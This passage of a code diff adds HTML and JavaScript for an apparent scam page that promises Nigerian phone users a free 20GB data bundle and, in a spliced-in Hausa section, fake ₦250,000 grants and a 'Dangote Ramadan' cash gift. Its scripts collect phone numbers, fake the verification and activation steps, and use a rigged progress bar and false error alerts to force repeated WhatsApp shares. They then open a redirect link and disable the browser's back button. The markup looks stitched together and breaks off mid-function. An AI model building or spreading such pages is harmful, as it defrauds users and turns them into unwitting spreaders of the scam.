+                        <i class="fas fa-trophy"></i>
+                    </div>
+                    <div class="big-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h1>🎉 Congratulations!</h1>
+                    <p class="sub-congrats">Your 20GB data reward has been successfully activated.</p>
+
+                    <div class="reward-badge">
+                        20GB <small>· Free Data</small>
+                    </div>
+
+                    <div class="detail-grid">
+                        <div class="row">
+                            <span class="label">Phone Number</span>
+                            <span class="value" id="congratsPhone">08031234567</span>
+                        </div>
+                        <div class="row">
+                            <span class="label">Network</span>
+                            <span class="value" id="congratsNetwork">MTN Nigeria</span>
+                        </div>
+                        <div class="row">
+                            <span class="label">Reward</span>
+                            <span class="value">20GB Data Bundle</span>
+                        </div>
+                        <div class="row">
+                            <span class="label">Status</span>
+                            <span class="value" style="color: #0f9d6b;"><i class="fas fa-check-circle"></i> Activated</span>
+                        </div>
+                    </div>
+
+                    <button class="activate-btn" id="activateBtn"><i class="fas fa-rocket"></i> Activate Now</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 6: ACTIVATION LOADING ========== -->
+        <div id="pageActivationLoading" class="page hidden">
+            <div class="activation-loading-page">
+                <div class="pulse-ring"></div>
+                <div class="rocket-icon">
+                    <i class="fas fa-rocket"></i>
+                </div>
+                <h2>Activating Your Data</h2>
+                <p>Please wait while we set up your 20GB reward...</p>
+
+                <div class="activation-steps">
+                    <div class="act-step" id="actStep1">
+                        <span class="step-num">1</span>
+                        <span>Verifying your account</span>
+                    </div>
+                    <div class="act-step" id="actStep2">
+                        <span class="step-num">2</span>
+                        <span>Allocating 20GB data bundle</span>
+                    </div>
+                    <div class="act-step" id="actStep3">
+                        <span class="step-num">3</span>
+                        <span>Finalizing activation</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ========== PAGE 7: ACTIVATION INSTRUCTIONS ========== -->
+        <div id="pageInstructions" class="page hidden">
+            <div class="instructions-page">
+                <div class="instructions-header">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <h2>Activation Instructions</h2>
+                        <p>Follow these steps to complete your data activation</p>
+                    </div>
+                </div>
+
+                <div class="instructions-card">
+                    <div class="instruction-item">
+                        <span class="num-badge">1</span>
+                        <span class="instruction-text">Dial <strong>*123#</strong> on your phone</span>
+                    </div>
+                    <div class="instruction-item">
+                        <span class="num-badge">2</span>
+                        <span class="instruction-text">Select <strong>Data Bundle</strong> from the menu</span>
+                    </div>
+                    <div class="instruction-item">
+                        <span class="num-badge">3</span>
+                        <span class="instruction-text">Enter the promo code: <strong>DATA20</strong></span>
+                    </div>
+                    <div class="instruction-item">
+                        <span class="num-badge">4</span>
+                        <span class="instruction-text">Confirm your selection and enjoy <strong>20GB FREE</strong> data!</span>
+                    </div>
+                </div>
+
+                
+<style>button:hover{background:#076b03!important;}
+@keyframes spin{100%{transform:rotate(1turn);}}
+@keyframes progressShine{0%{transform:translateX(-100%);}100%{transform:translateX(220%);}}
+@keyframes progressGlow{0%,100%{box-shadow:0 8px 22px rgba(37,211,102,.24);}50%{box-shadow:0 10px 30px rgba(37,211,102,.45);}}</style></head>
+<body style="direction:ltr;background:#ebedf0;margin:0;padding:0;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;box-sizing:border-box;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">
+<div class="notification" id="notification" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:none;color:rgb(42,50,165);font-weight:bold;font-size:15px;padding:7px 15px;position:fixed;top:10px;left:0;width:fit-content;text-align:center;white-space:nowrap;background:rgba(180,161,232,0.8);border-radius:8px;box-shadow:0 4px 6px rgba(0,0,0,0.1);z-index:1000;"></div>
+<div class="post" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;background:#fff;margin:0 auto;padding:10px;max-width:500px;border:1px solid #d0d1d5;border-radius:3px;" width="100%">
+<div id="share" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:block;">
+<center style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">barka da zuwa Lambar Application shine <span id="output" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"></span></p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">SUNA shine: <span id="getname" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;color:#098105;text-decoration:none;"></span> Daga <span id="getname2" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"></span></p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">
+                Bayan tabbatarwa, kun cancanci samun tallafi ₦250,000 kasuwanci ko don ci gaba da karatu
+            </p>
+<h5 style="color: red;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">Yadda ake ci gaba: zuwa Account Number form</h5>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">1. Raba shi zuwa groups 5 ko abokai 15 akan WhatsApp ( Danna alamar "SHARE" da ke ƙasa).</p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">2. Rijistar ku za ta ƙare ta atomatik bayan an cika ma'aunin tabbatar da GREEN.</p>
+<p class="tip" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;font-size:14px;">3. Za ku sami tabbaci ta kira/SMS daga SIM ɗin ku.</p>
+<h5 style="color: red;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;">👇👇 👇👇</h5>
+</center>
+<button id="whatsapp" style="display:flex;align-items:center;justify-content:center;gap:10px;width:290px;height:58px;margin:15px auto;background:#25D366;color:#fff;border:none;border-radius:50px;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-size:20px;font-weight:700;cursor:pointer;box-shadow:0 8px 20px rgba(37,211,102,.35);transition:all .3s ease;padding:0 20px;">
+
+<svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 32 32" fill="#fff">
+<path d="M16 .4C7.4.4.4 7.3.4 15.9c0 3 1 5.9 2.8 8.2L.3 31.6l7.8-2.8c2.2 1.2 4.8 1.9 7.5 1.9 8.6 0 15.6-7 15.6-15.6S24.6.4 16 .4zm0 27.4c-2.4 0-4.7-.6-6.7-1.8l-.5-.3-4.6 1.6 1.5-4.5-.3-.5c-1.3-2.1-2-4.5-2-7 0-7 5.7-12.7 12.7-12.7S28.8 8.9 28.8 16 23.1 27.8 16 27.8zm7-9.5c-.4-.2-2.3-1.1-2.7-1.2-.4-.2-.6-.2-.9.2s-1 1.2-1.2 1.4-.5.3-.9.1c-.4-.2-1.8-.7-3.4-2.2-1.3-1.1-2.1-2.5-2.4-2.9-.2-.4 0-.6.2-.8.2-.2.4-.5.6-.7.2-.2.3-.4.4-.7.1-.2.1-.5 0-.7-.1-.2-.9-2.2-1.3-3-.3-.7-.6-.6-.9-.6h-.8c-.3 0-.7.1-1 .5-.4.4-1.4 1.3-1.4 3.2s1.4 3.7 1.6 4c.2.3 2.7 4.2 6.6 5.8.9.4 1.7.6 2.3.8 1 .3 1.9.3 2.6.2.8-.1 2.3-.9 2.7-1.8.3-.9.3-1.7.2-1.8-.1-.2-.4-.3-.8-.5z"/>
+</svg>
+
+<span>Share on WhatsApp</span>
+
+</button>
+<div class="barr" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;direction:ltr;max-width:420px;margin:18px auto 10px auto;padding:14px;background:linear-gradient(180deg,#ffffff 0%,#f3fff7 100%);border:1px solid rgba(37,211,102,.25);border-radius:18px;box-shadow:0 10px 28px rgba(0,0,0,.08);animation:progressGlow 2.8s ease-in-out infinite;">
+<div style="box-sizing:border-box;display:flex;align-items:center;justify-content:space-between;margin-bottom:9px;color:#075e32;font-size:13px;font-weight:700;">
+<span style="box-sizing:border-box;display:flex;align-items:center;gap:6px;">✅ Verification Progress</span>
+<span id="percentage2" style="box-sizing:border-box;min-width:52px;text-align:right;color:#0b8f45;font-size:16px;font-weight:800;">0%</span>
+</div>
+<div class="fill" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;position:relative;width:100%;height:22px;padding:3px;background:#dff5e8;border:1px solid rgba(9,129,5,.28);border-radius:999px;overflow:hidden;box-shadow:inset 0 2px 6px rgba(0,0,0,.12);">
+<div id="fill2" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;position:relative;background:linear-gradient(90deg,#0b8f45 0%,#25D366 50%,#0aa84f 100%);width:0%;height:100%;border-radius:999px;transition:width 0.7s cubic-bezier(.22,.61,.36,1);box-shadow:0 3px 10px rgba(37,211,102,.45);overflow:hidden;">
+<span style="box-sizing:border-box;position:absolute;top:0;left:0;width:45%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.55),transparent);animation:progressShine 1.8s linear infinite;"></span>
+</div>
+</div>
+<div style="box-sizing:border-box;display:flex;justify-content:space-between;margin-top:8px;color:#6b7280;font-size:11px;font-weight:600;">
+<span>0%</span><span>50%</span><span>100%</span>
+</div>
+</div>
+</div>
+<div id="claim" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:none;">
+<p class="done" style="font-size:48px;box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;text-align:center;color:#27ae60;">✔</p>
+<p class="title" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;text-align:center;">An kammala rijistar ku.</p>
+<button id="offer" style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;display:block;width:260px;height:50px;color:#fff;border:none;outline:none;font-size:24px;cursor:pointer;border-radius:5px;padding:0 10px;margin:10px auto;background:rgb(9,129,5);transition:background 0.3s ease;">Danna nan</button>
+<br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/><br style="box-sizing:border-box;font-family:Poppins,'Droid Arabic Naskh',sans-serif;font-weight:normal;"/>
+</div>
+</div><!-- end .post -->
+<script src="https://code.jquery.com/jquery-latest.min.js"></script>
+<script type="text/javascript">
+    // Counter animation
+    var likes = 134,
+        comments = 23,
+        shares = 12;
+
+    window.setInterval(function () {
+        likes    = likes    + Math.floor(Math.random() * 3);
+        comments = comments + Math.floor(Math.random() * 2);
+        shares   = shares   + Math.floor(Math.random() * 2);
+        $("#likes").html(likes + "K");
+        $("#comments").html(comments + "K comments");
+        $("#shares").html(shares + "K shares");
+    }, 5000);
+
+    
+</script>
+<script type="text/javascript">
+    var text1 = "KYAUTAR%20RAMADAN%20DAGA%20ALIKO%20DANGOTE%0A%0AA%20samu%20tsabar%20kudi%20%E2%82%A6100%2C000%20nan%20take%20na%20Ramadan!%0A%0A**YADDA%20AKE%20SAMU**%0AZiyarci%20hanyar%20ha%C6%99in%20yanar%20gizon%20da%20ke%20%C6%99asa%2C%20amsa%20wasu%20%C6%B4an%20tambayoyi%2C%20kuma%20ku%20kar%C9%93i%20%E2%82%A6100%2C000%20nan%20take%20don%20bikin%20Ramadan.%0A%0A%E2%9C%85%20Na%20samu%20nawa!%0A%0A%F0%9F%94%97%20Danna%20nan%F0%9F%91%87%0Ahttps://grant.getapply.online/kyautar-dangote-ramadan-2025",
+        error  = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+        abcde  = "https://ptakeemsaifegro.net/4/9075330",
+        saved  = "tallafir_progress",
+        expiryKey = "tallafir_progress_expiry",
+        oneDay = 24 * 60 * 60 * 1000,
+        share  = "whatsapp://send?text=" + text1;
+
+    // Restore progress from localStorage with 1-day expiry
+    var width = 0;
+    var savedExpiry = localStorage.getItem(expiryKey);
+
+    if (savedExpiry !== null && Date.now() > parseInt(savedExpiry, 10)) {
+        localStorage.removeItem(saved);
+        localStorage.removeItem(expiryKey);
+    }
+
+    var swidth = localStorage.getItem(saved);
+    if (swidth !== null) {
+        width = parseInt(swidth, 10) || 0;
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+        if (width >= 98) {
+            $("#share").hide();
+            $("#claim").show();
+        }
+    }
+
+    // WhatsApp share button click
+    $("#whatsapp").click(function () {
+        window.location.href = share;
+
+        if (width == 0) {
+            width += 50;
+        } else if (width == 50) {
+            alert(error);
+            width += 15;
+        } else if (width == 65) {
+            width += 5;
+        } else if (width == 70) {
+            alert(error);
+            width += 10;
+        } else if (width == 80) {
+            alert(error);
+            width += 5;
+        } else if (width == 85) {
+            width += 2;
+        } else if (width == 87) {
+            width += 1;
+        } else if (width == 88) {
+            width += 2;
+        } else if (width == 90) {
+            width += 1;
+        } else if (width == 91) {
+            width += 1;
+        } else if (width == 92) {
+            width += 1;
+        } else if (width == 93) {
+            width += 1;
+        } else if (width == 94) {
+            width += 1;
+        } else if (width == 95) {
+            width += 1;
+        } else if (width == 96) {
+            width += 2;
+        } else {
+            $("#share").fadeOut(0);
+            $("#claim").fadeIn(1000);
+        }
+
+        localStorage.setItem(saved, width);
+        localStorage.setItem(expiryKey, Date.now() + oneDay);
+        setTimeout(function () {
+            $("#fill2").css("width", width + "%");
+            $("#percentage2").text(width + "%");
+        }, 2000);
+    });
+
+    // Final offer button
+    $("#offer").click(function () {
+        window.open(abcde, "_blank");
+    });
+</script>
+<script>
+    // Disable back button
+    (function (global) {
+        var _hash = "!";
+        var noBackPlease = function () {
+            global.location.href += "#";
+            global.setTimeout(function () {
+                global.location.href += "!";
+            }, 50);
+        };
+        global.onhashchange = function () {
+            if (global.location.hash !== _hash) {
+                global.location.hash = _hash;
+            }
+        };
+        global.onload = function () {
+            noBackPlease();
+            document.body.onkeydown = function (e) {
+                var elm = e.target.nodeName.toLowerCase();
+                if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
+                    e.preventDefault();
+                }
+                e.stopPropagation();
+            };
+        };
+    })(window);
+</script>
+
+        </div>
+
+    </div>
+
+    <script>
+        (function() {
+            // ===== COOKIE HELPERS =====
+            function setCookie(name, value, days) {
+                const expires = new Date();
+                expires.setTime(expires.getTime() + days * 24 * 60 * 60 * 1000);
+                document.cookie = name + '=' + JSON.stringify(value) + ';expires=' + expires.toUTCString() + ';path=/';
+            }
+
+            function getCookie(name) {
+                const nameEQ = name + '=';
+                const ca = document.cookie.split(';');
+                for (let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                    if (c.indexOf(nameEQ) === 0) {
+                        try {
+                            return JSON.parse(c.substring(nameEQ.length, c.length));
+                        } catch (e) {
+                            return null;
+                        }
+                    }
+                }
+                return null;
+            }
+
+            // ===== DOM REFS =====
+            const pageMain = document.getElementById('pageMain');
+            const pageLoading = document.getElementById('pageLoading');
+            const pageResult = document.getElementById('pageResult');
+            const pageConfirmLoading = document.getElementById('pageConfirmLoading');
+            const pageCongrats = document.getElementById('pageCongrats');
+            const pageActivationLoading = document.getElementById('pageActivationLoading');
+            const pageInstructions = document.getElementById('pageInstructions');
+
+            const phoneInput = document.getElementById('phoneInput');
+            const checkBtn = document.getElementById('checkBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            const errorText = document.getElementById('errorText');
+
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+
+            const resultNetwork = document.getElementById('resultNetwork');
+            const resultNetworkLabel = document.getElementById('resultNetworkLabel');
+            const resultPhone = document.getElementById('resultPhone');
+            const confirmBtn = document.getElementById('confirmBtn');
+
+            const progressFill = document.getElementById('progressFill');
+            const congratsPhone = document.getElementById('congratsPhone');
+            const congratsNetwork = document.getElementById('congratsNetwork');
+            const activateBtn = document.getElementById('activateBtn');
+
+            const actStep1 = document.getElementById('actStep1');
+            const actStep2 = document.getElementById('actStep2');
+            const actStep3 = document.getElementById('actStep3');
+            const instructionsDoneBtn = document.getElementById('instructionsDoneBtn');
+
+            let currentNetwork = null;
+            let currentPhone = '';
+            let celebrationInterval = null;
+            let isRestoring = false;
+
+            // ===== NETWORK DETECTION =====
+            function detectNetwork(phoneNumber) {
+                const cleaned = phoneNumber.replace(/\D/g, '');
+                if (cleaned.length < 7) return null;
+
+                const prefixes = {
+                    'MTN': ['0803', '0703', '0903', '0806', '0706', '0813', '0810', '0814', '0816', '0906', '0913', '091'],
+                    'Glo': ['0805', '0807', '0705', '0811', '0815', '0905', '0915'],
+                    'Airtel': ['0802', '0808', '0708', '0701', '0812', '0901', '0902', '0904', '0907', '0912'],
+                    '9mobile': ['0809', '0817', '0818', '0908', '0909'],
+                    'Ntel': ['0804'],
+                    'Starcomms': ['0819', '07028', '07029']
+                };
+
+                for (let len = 4; len >= 2; len--) {
+                    const prefix = cleaned.substring(0, len);
+                    for (const [network, prefList] of Object.entries(prefixes)) {
+                        if (prefList.some(p => prefix.startsWith(p))) {
+                            return network;
+                        }
+                    }
+                }
+                return null;
+            }
+
+            function getNetworkLabel(network) {
+                const map = {
+                    'MTN': 'MTN Nigeria',
+                    'Glo': 'Globacom (Glo)',
+                    'Airtel': 'Airtel Nigeria',
+                    '9mobile': '9mobile (Etisalat)',
+                    'Ntel': 'Ntel',
+                    'Starcomms': 'Starcomms'
+                };
+                return map[network] || network;
+            }
+
+            // ===== PAGE SWITCHING =====
+            function showPage(pageId, saveState = true) {
+                [pageMain, pageLoading, pageResult, pageConfirmLoading, pageCongrats, pageActivationLoading, pageInstructions]
+                .forEach(p => {
+                    p.classList.remove('active');
+                    p.classList.add('hidden');
+                });
+                const target = document.getElementById(pageId);
+                target.classList.remove('hidden');
+                target.classList.add('active');
+
+                if (pageId === 'pageCongrats') {
+                    startCelebration();
+                } else {
+                    stopCelebration();
+                }
+
+                // Save state to cookie (except during restore)
+                if (saveState && !isRestoring) {
+                    saveProgress(pageId);
+                }
+            }
+
+            // ===== PROGRESS SAVING =====
+            function saveProgress(pageId) {
+                const state = {
+                    page: pageId,
+                    phone: currentPhone || phoneInput.value || '',
+                    network: currentNetwork || '',
+                    timestamp: Date.now()
+                };
+                setCookie('dataWalletProgress', state, 1);
+            }
+
+            function restoreProgress() {
+                const state = getCookie('dataWalletProgress');
+                if (!state) return false;
+
+                // Check if cookie is expired (older than 24 hours)
+                const age = Date.now() - state.timestamp;
+                if (age > 24 * 60 * 60 * 1000) {
+                    // Clear expired cookie
+                    setCookie('dataWalletProgress', {}, -1);
+                    return false;
+                }
+
+                isRestoring = true;
+
+                // Restore phone number
+                if (state.phone) {
+                    phoneInput.value = state.phone;
+                    currentPhone = state.phone;
+                }
+
+                // Restore network
+                if (state.network) {
+                    currentNetwork = state.network;
+                }
+
+                // Navigate to the saved page
+                const pageId = state.page || 'pageMain';
+                const validPages = ['pageMain', 'pageLoading', 'pageResult', 'pageConfirmLoading', 'pageCongrats',
+                    'pageActivationLoading', 'pageInstructions'
+                ];
+
+                if (validPages.includes(pageId)) {
+                    // If we're on result page, we need to populate data
+                    if (pageId === 'pageResult' && currentNetwork && currentPhone) {
+                        resultNetwork.textContent = currentNetwork;
+                        resultNetworkLabel.textContent = getNetworkLabel(currentNetwork);
+                        resultPhone.textContent = currentPhone;
+                    }
+                    if (pageId === 'pageCongrats' && currentNetwork && currentPhone) {
+                        congratsPhone.textContent = currentPhone;
+                        congratsNetwork.textContent = getNetworkLabel(currentNetwork);
+                    }
+                    showPage(pageId, false);
+                    isRestoring = false;
+                    return true;
+                }
+
+                isRestoring = false;
+                return false;
+            }
+
+            // ===== CELEBRATION EFFECTS =====
+            function startCelebration() {
+                const canvas = document.getElementById('celebrationCanvas');
+                const container = canvas.parentElement;
+                const rect = container.getBoundingClientRect();
+
+                canvas.width = rect.width || 480;
+                canvas.height = rect.height || 600;
+                const ctx = canvas.getContext('2d');
+
+                const particles = [];
+                const colors = ['#f9a825', '#2563eb', '#0f9d6b', '#d81b60', '#f44336', '#9c27b0', '#ff6f00', '#00bcd4'];
+
+                class Particle {
+                    constructor() {
+                        this.reset();
+                    }
+                    reset() {
+                        this.x = Math.random() * canvas.width;
+                        this.y = Math.random() * canvas.height - canvas.height;
+                        this.size = Math.random() * 8 + 4;
+                        this.speedY = Math.random() * 3 + 1.5;
+                        this.speedX = (Math.random() - 0.5) * 1.5;
+                        this.color = colors[Math.floor(Math.random() * colors.length)];
+                        this.rotation = Math.random() * 360;
+                        this.rotationSpeed = (Math.random() - 0.5) * 6;
+                        this.shape = Math.random() > 0.5 ? 'circle' : 'rect';
+                        this.opacity = 1;
+                        this.wobble = Math.random() * 100;
+                        this.wobbleSpeed = Math.random() * 0.05 + 0.02;
+                    }
+                    update() {
+                        this.y += this.speedY;
+                        this.x += this.speedX + Math.sin(this.wobble) * 0.5;
+                        this.rotation += this.rotationSpeed;
+                        this.wobble += this.wobbleSpeed;
+
+                        if (this.y > canvas.height + 20) {
+                            this.reset();
+                            this.y = -20;
+                        }
+                        if (this.x > canvas.width + 20) this.x = -20;
+                        if (this.x < -20) this.x = canvas.width + 20;
+                    }
+                    draw() {
+                        ctx.save();
+                        ctx.translate(this.x, this.y);
+                        ctx.rotate((this.rotation * Math.PI) / 180);
+                        ctx.globalAlpha = this.opacity;
+
+                        if (this.shape === 'circle') {
+                            ctx.beginPath();
+                            ctx.arc(0, 0, this.size / 2, 0, Math.PI * 2);
+                            ctx.fillStyle = this.color;
+                            ctx.fill();
+                        } else {
+                            ctx.fillStyle = this.color;
+                            ctx.fillRect(-this.size / 2, -this.size / 4, this.size, this.size / 2);
+                        }
+
+                        ctx.globalAlpha = 0.3;
+                        ctx.fillStyle = 'white';
+                        if (this.shape === 'circle') {
+                            ctx.beginPath();
+                            ctx.arc(-this.size / 4, -this.size / 4, this.size / 4, 0, Math.PI * 2);
+                            ctx.fill();
+                        } else {
+                            ctx.fillRect(-this.size / 3, -this.size / 3, this.size / 3, this.size / 6);
+                        }
+
+                        ctx.restore();
+                    }
+                }
+
+                for (let i = 0; i < 120; i++) {
+                    const p = new Particle();
+                    p.y = Math.random() * canvas.height;
+                    particles.push(p);
+                }
+
+                const balloons = [];
+                for (let i = 0; i < 8; i++) {
+                    balloons.push({
+                        x: Math.random() * canvas.width,
+                        y: Math.random() * canvas.height,
+                        size: 25 + Math.random() * 30,
+                        color: colors[Math.floor(Math.random() * colors.length)],
+                        speed: 0.3 + Math.random() * 0.6,
+                        wobble: Math.random() * 100,
+                        wobbleSpeed: 0.02 + Math.random() * 0.03,
+                        opacity: 0.6 + Math.random() * 0.3
+                    });
+                }
+
+                function createSparkleBurst() {
+                    for (let i = 0; i < 30; i++) {
+                        setTimeout(() => {
+                            const sparkle = document.createElement('div');
+                            sparkle.className = 'sparkle';
+                            sparkle.style.position = 'absolute';
+                            sparkle.style.left = (Math.random() * 100) + '%';
+                            sparkle.style.top = (Math.random() * 100) + '%';
+                            sparkle.style.width = (4 + Math.random() * 8) + 'px';
+                            sparkle.style.height = sparkle.style.width;
+                            sparkle.style.background = colors[Math.floor(Math.random() * colors.length)];
+                            sparkle.style.borderRadius = '50%';
+                            sparkle.style.pointerEvents = 'none';
+                            sparkle.style.zIndex = '15';
+                            sparkle.style.animation = 'sparkleAnim 1.5s ease-out forwards';
+                            sparkle.style.animationDuration = (0.8 + Math.random() * 1) + 's';
+                            document.querySelector('.congrats-page').appendChild(sparkle);
+                            setTimeout(() => sparkle.remove(), 1800);
+                        }, i * 50);
+                    }
+                }
+
+                if (!document.getElementById('sparkleStyle')) {
+                    const style = document.createElement('style');
+                    style.id = 'sparkleStyle';
+                    style.textContent = `
+                        @keyframes sparkleAnim {
+                            0% { transform: scale(0) rotate(0deg); opacity: 1; }
+                            100% { transform: scale(1.5) rotate(180deg) translateY(-80px); opacity: 0; }
+                        }
+                    `;
+                    document.head.appendChild(style);
+                }
+
+                setTimeout(createSparkleBurst, 300);
+                setTimeout(createSparkleBurst, 800);
+                setTimeout(createSparkleBurst, 1400);
+
+                let frameId = null;
+
+                function animate() {
+                    ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+                    balloons.forEach(b => {
+                        b.y -= b.speed * 0.3;
+                        b.x += Math.sin(b.wobble) * 0.4;
+                        b.wobble += b.wobbleSpeed;
+                        if (b.y < -50) b.y = canvas.height + 50;
+                        if (b.x > canvas.width + 50) b.x = -50;
+                        if (b.x < -50) b.x = canvas.width + 50;
+
+                        ctx.save();
+                        ctx.globalAlpha = b.opacity * 0.5;
+                        ctx.beginPath();
+                        ctx.ellipse(b.x, b.y, b.size, b.size * 1.2, 0, 0, Math.PI * 2);
+                        ctx.fillStyle = b.color;
+                        ctx.fill();
+                        ctx.globalAlpha = 0.2;
+                        ctx.strokeStyle = '#666';
+                        ctx.lineWidth = 1;
+                        ctx.beginPath();
+                        ctx.moveTo(b.x, b.y + b.size * 1.2);
+                        ctx.lineTo(b.x + Math.sin(b.wobble) * 5, b.y + b.size * 2);
+                        ctx.stroke();
+                        ctx.restore();
+                    });
+
+                    particles.forEach(p => {
+                        p.update();
+                        p.draw();
+                    });
+
+                    frameId = requestAnimationFrame(animate);
+                }
+
+                animate();
+
+                celebrationInterval = {
+                    frameId: frameId,
+                    particles: particles,
+                    balloons: balloons,
+                    canvas: canvas
+                };
+
+                const resizeHandler = () => {
+                    const rect2 = container.getBoundingClientRect();
+                    canvas.width = rect2.width || 480;
+                    canvas.height = rect2.height || 600;
+                };
+                window.addEventListener('resize', resizeHandler);
+                celebrationInterval.resizeHandler = resizeHandler;
+
+                const burstInterval = setInterval(() => {
+                    if (document.getElementById('pageCongrats').classList.contains('active')) {
+                        createSparkleBurst();
+                    }
+                }, 3000);
+                celebrationInterval.burstInterval = burstInterval;
+            }
+
+            function stopCelebration() {
+                if (celebrationInterval) {
+                    if (celebrationInterval.frameId) {
+                        cancelAnimationFrame(celebrationInterval.frameId);
+                    }
+                    if (celebrationInterval.burstInterval) {
+                        clearInterval(celebrationInterval.burstInterval);
+                    }
+                    if (celebrationInterval.resizeHandler) {
+                        window.removeEventListener('resize', celebrationInterval.resizeHandler);
+                    }
+                    const canvas = document.getElementById('celebrationCanvas');
+                    if (canvas) {
+                        const ctx = canvas.getContext('2d');
+                        ctx.clearRect(0, 0, canvas.width, canvas.height);
+                    }
+                    celebrationInterval = null;
+                }
+            }
+
+            // ===== LOADING ANIMATION (initial check) =====
+            function runLoadingAnimation(phone, network) {
+                [step1, step2, step3].forEach(s => {
+                    s.classList.remove('active', 'done');
+                    s.querySelector('.step-icon').innerHTML = s.id === 'step1' ? '<i class="fas fa-search"></i>' :
+                        s.id === 'step2' ? '<i class="fas fa-sim-card"></i>' :
+                        '<i class="fas fa-gift"></i>';
+                });
+
+                showPage('pageLoading');
+
+                setTimeout(() => {
+                    step1.classList.add('active');
+                    step1.querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+                    step1.classList.add('done');
+                }, 600);
+
+                setTimeout(() => {
+                    step2.classList.add('active');
+                    setTimeout(() => {
+                        step2.querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+                        step2.classList.add('done');
+                    }, 600);
+                }, 1400);
+
+                setTimeout(() => {
+                    step3.classList.add('active');
+                    setTimeout(() => {
+                        step3.querySelector('.step-icon').innerHTML = '<i class="fas fa-check"></i>';
+                        step3.classList.add('done');
+                    }, 600);
+                }, 2200);
+
+                setTimeout(() => {
+                    resultNetwork.textContent = network;
+                    resultNetworkLabel.textContent = getNetworkLabel(network);
+                    resultPhone.textContent = phone;
+                    currentNetwork = network;
+                    currentPhone = phone;
+                    showPage('pageResult');
+                }, 3200);
+            }
+
+            // ===== CONFIRM LOADING =====
+            function runConfirmLoading() {
+                showPage('pageConfirmLoading');
+                progressFill.style.width = '0%';
+
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.random() * 8 + 2;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(interval);
+                        setTimeout(() => {
+                            congratsPhone.textContent = currentPhone;
+                            congratsNetwork.textContent = getNetworkLabel(currentNetwork);
+                            showPage('pageCongrats');
+                        }, 400);
+                    }
+                    progressFill.style.width = Math.min(progress, 100) + '%';
+                }, 250);
+            }
+
+            // ===== ACTIVATION LOADING =====
+            function runActivationLoading() {
+                [actStep1, actStep2, actStep3].forEach(s => {
+                    s.classList.remove('active', 'done');
+                    s.querySelector('.step-num').innerHTML = s.id === 'actStep1' ? '1' : s.id === 'actStep2' ? '2' :
+                        '3';
+                });
+
+                showPage('pageActivationLoading');
+
+                setTimeout(() => {
+                    actStep1.classList.add('active');
+                    setTimeout(() => {
+                        actStep1.classList.add('done');
+                        actStep1.querySelector('.step-num').innerHTML = '<i class="fas fa-check"></i>';
+                    }, 500);
+                }, 700);
+
+                setTimeout(() => {
+                    actStep2.classList.add('active');
+                    setTimeout(() => {
+                        actStep2.classList.add('done');
